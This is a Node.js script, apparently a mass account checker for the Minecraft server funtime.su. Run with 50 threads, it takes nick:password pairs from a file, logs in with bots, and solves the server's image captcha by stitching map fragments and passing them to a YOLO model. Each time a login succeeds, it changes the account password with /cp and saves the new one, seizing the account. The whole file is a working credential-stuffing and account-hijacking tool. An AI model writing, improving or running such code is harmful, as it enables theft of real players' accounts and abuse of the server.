const mineflayer = require('mineflayer');
const FlayerCaptcha = require('flayercaptcha');
const { spawn, exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const sharp = require('sharp');

const CONFIG = {
    host: 'funtime.su',
    port: 25565,
    version: '1.16.5',

    delayBetweenAccounts: 100,
    timeout: 90000,

    multiThreading: true,
    threads: 50,

    usersFile: 'users.txt',
};

class CaptchaService {
    constructor() {
        this.process = null;
        this.queue = [];
        this.ready = false;
    }

    start() {
        return new Promise((resolve, reject) => {
            console.log('🐍 Starting Python YOLO Service...');
            this.process = spawn('python3', ['captcha.py'], { cwd: __dirname });

            this.process.on('error', (err) => {
                console.log('🐍 python3 failed, trying python...');
                this.process = spawn('python', ['captcha.py'], { cwd: __dirname });
                this.setupListeners(resolve, reject);
            });

            this.setupListeners(resolve, reject);
        });
    }

    setupListeners(resolve, reject) {
        if (!this.process) return;
        this.process.stdout.on('data', (data) => {
            const lines = data.toString().split('\n');
            for (let line of lines) {
                line = line.trim();
                if (!line) continue;
                if (!this.ready) {
                    if (line === 'READY') {
                        this.ready = true;
                        console.log('🐍 Python Service READY');
                        resolve();
                    } else if (line.startsWith('ERROR')) {
                        reject(new Error(line));
                    }
                } else {
                    if (this.queue.length > 0) {
                        const { resolve: taskResolve } = this.queue.shift();
                        if (line.startsWith('ERROR') || line === 'EMPTY') taskResolve(null);
                        else taskResolve(line);
                    }
                }
            }
        });
    }

    solve(imagePath) {
        if (!this.ready) return Promise.resolve(null);
        return new Promise((resolve, reject) => {
            this.queue.push({ resolve, reject });
            try { this.process.stdin.write(imagePath + '\n'); }
            catch (e) { this.queue.pop(); resolve(null); }
        });
    }
    stop() { if (this.process) this.process.kill(); }
}
const captchaService = new CaptchaService();

const originalWarn = console.warn;
console.warn = (...args) => {
    if (typeof args[0] === 'string' && args[0].includes('Ignoring block entities')) return;
    originalWarn.apply(console, args);
};

function formatTime(ms) {
    if (ms < 1000) return `${ms}ms`;
    return `${(ms / 1000).toFixed(2)}s`;
}

function getTimestamp() {
    return new Date().toLocaleTimeString('ru-RU');
}

function generatePassword(length = 10) {
    const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let ret = '';
    for (let i = 0, n = charset.length; i < length; ++i) {
        ret += charset.charAt(Math.floor(Math.random() * n));
    }
    return ret;
}

const log = {
    info: (nick, msg) => console.log(`[${getTimestamp()}] \x1b[36m${nick}\x1b[0m - ${msg}`),
    processing: (nick) => console.log(`[${getTimestamp()}] \x1b[33m${nick}\x1b[0m - ⏳ processing...`),
    valid: (nick, time) => console.log(`[${getTimestamp()}] \x1b[32m${nick}\x1b[0m - ✅ VALID (${formatTime(time)})`),
    invalid: (nick, time) => console.log(`[${getTimestamp()}] \x1b[31m${nick}\x1b[0m - ❌ INVALID (${formatTime(time)})`),
    notRegistered: (nick, time) => console.log(`[${getTimestamp()}] \x1b[35m${nick}\x1b[0m - 📝 NOT_REGISTERED (${formatTime(time)})`),
    error: (nick, msg, time) => console.log(`[${getTimestamp()}] \x1b[31m${nick}\x1b[0m - ⚠️ ERROR: ${msg} (${formatTime(time || 0)})`),
    online: (nick, time) => console.log(`[${getTimestamp()}] \x1b[34m${nick}\x1b[0m - 🌐 ONLINE (${formatTime(time)})`),
    chat: (msg) => console.log(`  \x1b[90m💬 ${msg}\x1b[0m`),
};

function readUsers() {
    const content = fs.readFileSync(CONFIG.usersFile, 'utf8');
    const users = [];

    for (const line of content.split('\n')) {
        const trimmed = line.trim();
        if (!trimmed) continue;
        if (trimmed.includes(' - ')) continue;

        const [nick, password] = trimmed.split(':');
        if (nick && password) {
            users.push({ nick: nick.trim(), password: password.trim() });
        }
    }
    return users;
}

function updateUserResult(nick, password, result, newPassword = null) {
    let content = fs.readFileSync(CONFIG.usersFile, 'utf8');
    const lines = content.split('\n');
    const newLines = lines.map(line => {
        const trimmed = line.trim();
        if (trimmed.startsWith(`${nick}:${password}`)) {
            if (newPassword && result === 'VALID') {
                return `${nick}:${password}:${newPassword} - ${result}`;
            }
            return `${nick}:${password} - ${result}`;
        }
        return line;
    });
    fs.writeFileSync(CONFIG.usersFile, newLines.join('\n'));
}

function extractText(obj) {
    if (obj === null || obj === undefined) return '';

    if (typeof obj === 'string') {
        try {
            const parsed = JSON.parse(obj);
            if (parsed && typeof parsed === 'object') return extractText(parsed);
        } catch { }
        return obj;
    }

    if (typeof obj === 'number') return String(obj);

    let result = '';

    if (obj.text) {
        if (typeof obj.text === 'string') result += obj.text;
        else if (typeof obj.text === 'object' && obj.text.hasOwnProperty('value')) result += obj.text.value;
        else if (typeof obj.text === 'object') result += extractText(obj.text);
    }

    if (obj.value && (typeof obj.value === 'string' || typeof obj.value === 'number')) {
        result += String(obj.value);
    }
    if (obj.extra) {
        const extraArr = Array.isArray(obj.extra) ? obj.extra : (obj.extra.value || []);
        if (Array.isArray(extraArr)) {
            for (const item of extraArr) {
                result += extractText(item);
            }
        }
    }

    if (obj.with) {
        const withArr = Array.isArray(obj.with) ? obj.with : (obj.with.value || []);
        if (Array.isArray(withArr)) {
            for (const item of withArr) {
                result += ' ' + extractText(item);
            }
        }
    }

    if (Array.isArray(obj)) {
        for (const item of obj) {
            result += extractText(item);
        }
    }

    return result;
}

class AccountChecker {
    constructor() {
        this.bot = null;
        this.startTime = 0;
    }

    async checkAccount(nick, password) {
        this.startTime = Date.now();
        log.processing(nick);

        return new Promise((resolve) => {
            let resolved = false;
            let captchaSolved = false;
            let loginSent = false;
            let authorized = false;

            const finish = (status, extra = {}) => {
                if (resolved) return;
                resolved = true;
                const elapsed = Date.now() - this.startTime;

                switch (status) {
                    case 'VALID':
                    case 'VALID(2FA)':
                        log.valid(nick, elapsed + (status === 'VALID(2FA)' ? ' [2FA]' : ''));
                        break;
                    case 'INVALID':
                        log.invalid(nick, elapsed);
                        break;
                    case 'NOT_REGISTERED':
                        log.notRegistered(nick, elapsed);
                        break;
                    case 'ONLINE':
                        log.online(nick, elapsed);
                        break;
                    default:
                        log.error(nick, extra.error || status, elapsed);
                }

                const imagePath = path.resolve(__dirname, `captcha_${nick}.png`);
                if (fs.existsSync(imagePath)) {
                    try {
                        fs.unlinkSync(imagePath);
                    } catch (e) { }
                }

                this.cleanup();
                resolve({ status, elapsed, ...extra });
            };

            const timeout = setTimeout(() => {
                finish('TIMEOUT', { error: 'Timeout' });
            }, CONFIG.timeout);

            try {
                this.bot = mineflayer.createBot({
                    host: CONFIG.host,
                    port: CONFIG.port,
                    username: nick,
                    version: CONFIG.version,
                    auth: 'offline',
                });

                const bot = this.bot;

                let captcha;
                try {
                    captcha = new FlayerCaptcha(bot);
                } catch (err) {
                    log.info(nick, `⚠️ FlayerCaptcha init error: ${err.message}`);
                }

                bot.on('error', (err) => {
                    clearTimeout(timeout);
                    finish('ERROR', { error: err.message });
                });

                bot.on('kicked', (reason) => {
                    clearTimeout(timeout);

                    let reasonText = extractText(reason);
                    if (!reasonText) {
                        try {
                            reasonText = JSON.stringify(reason);
                        } catch {
                            reasonText = String(reason);
                        }
                    }

                    log.info(nick, `🚫 Kicked: ${reasonText}`);

                    if (reasonText.toLowerCase().includes('неправильн')) {
                        finish('INVALID');
                    } else if (reasonText.toLowerCase().includes('не прошли')) {
                        finish('CAPTCHA_FAILED', { error: 'Captcha failed' });
                    } else if (reasonText.includes('с таким-же ником уже онлайн') || reasonText.includes('уже онлайн')) {
                        finish('ONLINE');
                    } else {
                        finish('KICKED', { error: reasonText.substring(0, 100) });
                    }
                });

                let captchaMode = false;

                bot.on('message', async (message) => {
                    const text = message.toString();
                    log.chat(text);

                    if (text.includes('Введите номер с картинки') || text.includes('картинки')) {
                        if (!captchaMode) {
                            log.info(nick, "🧩 Captcha detected! Blocking login until solved.");
                            captchaMode = true;
                        }
                        return;
                    }

                    if (text.includes('Подтвердите вход через ВК или ТГ') || text.includes('Проверьте личные сообщения')) {
                        log.info(nick, "🛡️ 2FA detected!");
                        clearTimeout(timeout);
                        finish('VALID(2FA)');
                        return;
                    }

                    if (text.includes('Проверка пройдена') || text.includes('прошли')) {
                        log.info(nick, "✅ Captcha passed.");
                        captchaMode = false;
                        if (!loginSent) {
                            log.info(nick, `🔑 Sending /login in 1s...`);
                            loginSent = true;
                            setTimeout(() => {
                                bot.chat(`/login ${password}`);
                            }, 1000);
                        }
                        return;
                    }

                    if (text.includes('неправильно') && (text.includes('капч') || text.includes('код'))) {
                        log.info(nick, "⚠️ Captcha wrong. Resetting solver...");
                        captchaMode = true;
                        captchaSolved = false;
                        captchaCandidates = [];
                        return;
                    }

                    if (text.includes('Успешная авторизация') || text.includes('Вы вошли') || text.includes('авторизован') || text.includes('Добро пожаловать')) {
                        if (authorized) return;
                        authorized = true;

                        clearTimeout(timeout);
                        const newPassword = generatePassword(12);
                        log.info(nick, `🔐 Changing password to ${newPassword}`);
                        bot.chat(`/cp ${password} ${newPassword}`);

                        setTimeout(() => {
                            finish('VALID', { newPassword });
                        }, 1000);
                        return;
                    }

                    if (text.includes('Зарегистрируйтесь') || text.includes('/reg')) {
                        clearTimeout(timeout);
                        finish('NOT_REGISTERED');
                        return;
                    }

                    if (text.toLowerCase().includes('неверный пароль') || text.toLowerCase().includes('пароль неверный')) {
                        clearTimeout(timeout);
                        finish('INVALID');
                        return;
                    }

                    if ((text.includes('/login') || text.includes('Войдите в игру')) && !captchaMode) {
                        if (!loginSent) {
                            log.info(nick, "🔑 Server requested login. Sending in 1s...");
                            loginSent = true;
                            setTimeout(() => {
                                if (!this.destroyed) bot.chat(`/login ${password}`);
                            }, 1000);
                        }
                        return;
                    }
                });

                let captchaCandidates = [];
                let processingTimer = null;

                const handleCaptchaCandidate = (image, data, type) => {
                    if (captchaSolved || this.destroyed) return;

                    const distance = data.minDistance || data.distance || 999;
                    const facing = data.facing || 'unknown';
                    const validData = data.data || data;
                    const viewDirection = validData.viewDirection;

                    if (type === 'frameInfo' && distance < 6) {
                        captchaCandidates.push({
                            image,
                            distance,
                            facing,
                            viewDirection,
                            coordinate: validData.coordinate || validData.coordinates,
                            timestamp: Date.now()
                        });
                    }

                    if (!processingTimer && !this.destroyed) {
                        log.info(nick, '⏳ Collecting captcha fragments...');
                        processingTimer = setTimeout(processBestCandidate, 2000);
                    }
                };

                const processBestCandidate = async () => {
                    if (this.destroyed || captchaSolved || captchaCandidates.length === 0) return;

                    log.info(nick, `📊 Analyzing ${captchaCandidates.length} fragments...`);

                    const forwardFragments = captchaCandidates.filter(c => c.facing === 'forward');
                    const fragmentsToUse = forwardFragments.length > 0 ? forwardFragments : captchaCandidates;

                    if (fragmentsToUse.length === 0) {
                        log.info(nick, '⚠️ No suitable fragments found');
                        captchaCandidates = [];
                        processingTimer = null;
                        return;
                    }

                    log.info(nick, `🧩 Stitching ${fragmentsToUse.length} fragments into one image...`);

                    try {
                        if (this.destroyed) return;

                        let minX = Infinity, maxX = -Infinity;
                        let minY = Infinity, maxY = -Infinity;
                        let minZ = Infinity, maxZ = -Infinity;

                        fragmentsToUse.forEach(f => {
                            const c = f.coordinate;
                            if (!c) return;
                            if (c.x < minX) minX = c.x;
                            if (c.x > maxX) maxX = c.x;
                            if (c.y < minY) minY = c.y;
                            if (c.y > maxY) maxY = c.y;
                            if (c.z < minZ) minZ = c.z;
                            if (c.z > maxZ) maxZ = c.z;
                        });

                        const widthX = maxX - minX;
                        const widthZ = maxZ - minZ;
                        const isZWall = widthX > widthZ;

                        const cols = (isZWall ? widthX : widthZ) + 1;
                        const rows = (maxY - minY) + 1;

                        const CANVAS_WIDTH = cols * 128;
                        const CANVAS_HEIGHT = rows * 128;

                        const viewDir = fragmentsToUse[0].viewDirection;
                        log.info(nick, `📐 Canvas: ${cols}x${rows} (${CANVAS_WIDTH}x${CANVAS_HEIGHT}px), Dir: ${viewDir}`);

                        const composites = [];

                        for (const fragment of fragmentsToUse) {
                            if (!fragment.coordinate) continue;

                            const y = fragment.coordinate.y;
                            const top = (maxY - y) * 128;

                            let left = 0;
                            if (viewDir === 'north') {
                                left = (maxX - fragment.coordinate.x) * 128;
                            } else if (viewDir === 'south') {
                                left = (fragment.coordinate.x - minX) * 128;
                            } else if (viewDir === 'east') {
                                left = (maxZ - fragment.coordinate.z) * 128;
                            } else if (viewDir === 'west') {
                                left = (fragment.coordinate.z - minZ) * 128;
                            } else {
                                if (isZWall) left = (fragment.coordinate.x - minX) * 128;
                                else left = (fragment.coordinate.z - minZ) * 128;
                            }

                            let input = fragment.image;
                            try {
                                if (input && typeof input.toBuffer === 'function') {
                                    input = await input.png().toBuffer();
                                }
                            } catch (e) {
                                log.error(nick, `Img conv error: ${e.message}`);
                                continue;
                            }

                            composites.push({
                                input: input,
                                top: Math.round(top),
                                left: Math.round(left)
                            });
                        }

                        const imageName = `captcha_${nick}.png`;
                        const captchaPath = path.join(__dirname, imageName);

                        if (this.destroyed) return;

                        await sharp({
                            create: {
                                width: CANVAS_WIDTH,
                                height: CANVAS_HEIGHT,
                                channels: 4,
                                background: { r: 0, g: 0, b: 0, alpha: 0 }
                            }
                        })
                            .composite(composites)
                            .png()
                            .toFile(captchaPath);

                        log.info(nick, `📸 Stitched & Saved to ${captchaPath}`);

                        if (this.destroyed) return;

                        const captchaResult = await captchaService.solve(captchaPath);
                        log.info(nick, `🔴 Captcha result: ${captchaResult}`);

                        if (captchaResult) {
                            captchaSolved = true;
                            bot.chat(captchaResult);
                        } else {
                            log.info(nick, `⚠️ Empty captcha result from YOLO, waiting for more fragments or retry...`);
                            captchaCandidates = [];
                        }

                    } catch (err) {
                        log.error(nick, `Stitching/Solving error: ${err.message}`);
                    }
                    captchaCandidates = [];
                    processingTimer = null;
                };

                if (captcha) {
                    captcha.on('imageReady', ({ image, data }) => {
                        handleCaptchaCandidate(image, data, 'imageReady');
                    });

                    captcha.on('frameInfo', ({ image, data }) => {
                        handleCaptchaCandidate(image, data, 'frameInfo');
                    });

                    captcha.on('error', (err) => {
                        log.info(nick, `⚠️ FlayerCaptcha error: ${err}`);
                    });
                }

                bot.on('spawn', () => {
                    log.info(nick, '🌍 Spawned (waiting for captcha/auth)');
                });

                bot.on('login', () => {
                    log.info(nick, '🔌 Connected');
                });

            } catch (err) {
                clearTimeout(timeout);
                finish('ERROR', { error: err.message });
            }
        });
    }

    async cleanup() {
        if (this.bot) {
            this.bot.removeAllListeners();
            this.bot.on('error', () => { });

            try {
                this.bot.quit();
            } catch (e) {
            }
            this.bot = null;
        }
    }
}

async function main() {
    const startTime = Date.now();
    console.log('\n' + '='.repeat(60));
    console.log('  🎮 FunTime.su Account Checker');
    console.log('  📊 YOLO Captcha Solver + FlayerCaptcha');
    console.log(`  🚀 Multi-threading: ${CONFIG.multiThreading ? `ON (${CONFIG.threads} threads)` : 'OFF'}`);
    console.log('='.repeat(60) + '\n');

    try {
        await captchaService.start();
    } catch (e) {
        console.error('❌ Failed to start Python service:', e.message);
        process.exit(1);
    }

    if (!fs.existsSync(CONFIG.usersFile)) {
        console.error(`❌ ${CONFIG.usersFile} not found!`);
        console.log('Format: nick:password');
        process.exit(1);
    }

    const users = readUsers();

    if (users.length === 0) {
        console.log('✅ All accounts processed!');
        process.exit(0);
    }

    console.log(`📋 ${users.length} accounts to check\n`);

    const results = { VALID: 0, INVALID: 0, NOT_REGISTERED: 0, ERROR: 0, ONLINE: 0 };
    let processedCount = 0;

    const processUser = async (user, index) => {
        const threadPrefix = CONFIG.multiThreading ? ` ` : `[${index + 1}/${users.length}] `;
        if (!CONFIG.multiThreading) console.log(`\n${threadPrefix}`);

        const maxRetries = 3;
        let attempt = 0;
        let finalResult = null;

        while (attempt < maxRetries) {
            attempt++;
            if (attempt > 1) {
                console.log(`${threadPrefix}🔄 Retry attempt ${attempt}/${maxRetries} for ${user.nick}...`);
                await new Promise(r => setTimeout(r, 2000));
            }

            const checker = new AccountChecker();
            const result = await checker.checkAccount(user.nick, user.password);
            finalResult = result;

            if (['VALID', 'VALID(2FA)', 'INVALID', 'NOT_REGISTERED', 'ONLINE'].includes(result.status)) {
                break;
            }
        }

        results[finalResult.status] = (results[finalResult.status] || 0) + 1;
        updateUserResult(user.nick, user.password, finalResult.status, finalResult.newPassword);

        processedCount++;

        if (CONFIG.multiThreading) {
            const percent = ((processedCount / users.length) * 100).toFixed(1);
            console.log(`  📈 Progress: ${processedCount}/${users.length} (${percent}%)`);
        }
    };

    if (CONFIG.multiThreading) {
        const queue = [...users];
        const activeWorkers = [];
        const maxThreads = Math.min(CONFIG.threads, users.length);

        console.log(`🧵 Starting ${maxThreads} workers...`);

        const worker = async () => {
            while (queue.length > 0) {
                const user = queue.shift();
                if (!user) continue;
                await processUser(user, 0);

                if (queue.length > 0) {
                    await new Promise(r => setTimeout(r, CONFIG.delayBetweenAccounts));
                }
            }
        };

        for (let i = 0; i < maxThreads; i++) {
            activeWorkers.push(worker());
        }

        await Promise.all(activeWorkers);

    } else {
        for (let i = 0; i < users.length; i++) {
            await processUser(users[i], i);

            if (i < users.length - 1) {
                await new Promise(r => setTimeout(r, CONFIG.delayBetweenAccounts));
            }
        }
    }

    console.log('\n' + '='.repeat(60));
    console.log('  📊 RESULTS');
    console.log('='.repeat(60));

    const keys = Object.keys(results).sort();

    for (const key of keys) {
        let icon = '❓';
        if (key === 'VALID') icon = '✅';
        else if (key === 'INVALID') icon = '❌';
        else if (key === 'NOT_REGISTERED') icon = '📝';
        else if (key === 'ERROR') icon = '⚠️ ';
        else if (key === 'ONLINE') icon = '🌐';
        else if (key === 'TIMEOUT') icon = '⏰';

        console.log(`  ${icon} ${key.padEnd(15)}: ${results[key]}`);
    }

    const totalTime = (Date.now() - startTime) / 1000;
    const speed = (users.length / totalTime).toFixed(2);

    console.log('-'.repeat(60));
    console.log(`  ⏱️  Total Time:   ${totalTime.toFixed(1)}s`);
    console.log(`  ⚡ Speed:         ${speed} acc/s`);
    console.log('='.repeat(60) + '\n');
    captchaService.stop();
    process.exit(0);
}

main().catch(console.error);
